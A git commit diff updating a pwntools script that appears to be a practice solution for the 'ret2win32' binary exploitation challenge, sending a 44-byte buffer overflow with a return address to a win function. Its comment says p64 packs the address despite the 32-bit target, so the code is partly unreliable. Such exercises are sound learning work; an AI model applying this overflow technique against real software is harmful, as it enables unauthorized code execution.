268a14b119e7d05c41126ecd42c4622e04826108
Donovan Griffin <donovangriffin0214@gmail.com>
2024-07-18 10:27:25 -0400

    'warmupl' solution

--- warmup/warmsol.py
+++ warmup/warmsol.py
@@ -1,15 +1,19 @@
 #!/usr/bin/env python
 from pwn import *
 
-io = process('./warmup')
+io = process('./ret2win32')
+
+context.bits = 32
 
 # Construct payload for buffer overflow
-bfr_oflw = b'A' * 72 + p64(0x0040060d)  # Use p64 for packing 64-bit integer (assuming address)
+bfr_oflw = b'A' * 44  + p64(0x804862c)  # Use p64 for packing 64-bit integer (assuming address)
 
-gdb.attach(io, gdbscript = 'b *  0x0040060d')
+#attatch the memory adress
+gdb.attach(io, gdbscript = 'b *  0x804862c')
 
 io.recvuntil(b'>')
 
+#send the overflow variable
 io.sendline(bfr_oflw)
 
 io.interactive()
